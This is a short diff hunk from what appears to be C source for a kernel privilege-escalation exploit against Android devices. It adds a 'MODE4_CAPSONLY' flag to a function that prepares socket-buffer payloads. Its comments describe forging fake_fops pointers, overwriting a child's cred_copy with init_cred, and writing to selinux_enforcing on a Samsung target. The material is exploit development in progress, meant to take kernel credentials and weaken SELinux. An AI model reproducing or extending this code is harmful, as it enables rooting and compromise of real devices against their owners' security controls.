@@ -1615,7 +1615,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         use_classic = 1;
       if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0) ||
           env_flag("MODE4_SLIDE_CRED", 0) || env_flag("MODE4_SLIDE_KPTR", 0) ||
-          env_flag("MODE4_SLIDE_GBOOT", 0)) {
+          env_flag("MODE4_SLIDE_GBOOT", 0) ||
+          env_flag("MODE4_CAPSONLY", 0)) {
+        /* CAPSONLY added: the W0.pi would write fake_fops (hardcoded
+         * parent) to the SAME target as the main tree (child+0x780),
+         * OVERWRITING the correct cred_copy value. Make W0.pi inert. */
         /* Stack stamp writes 0 / init_cred. Heap only-left parent=fake_fops
          * onto selinux_enforcing stores a kernel pointer there (Samsung
          * EMERALD: non-NULL STORE = KP). Keep W0.pi an empty black leaf. */
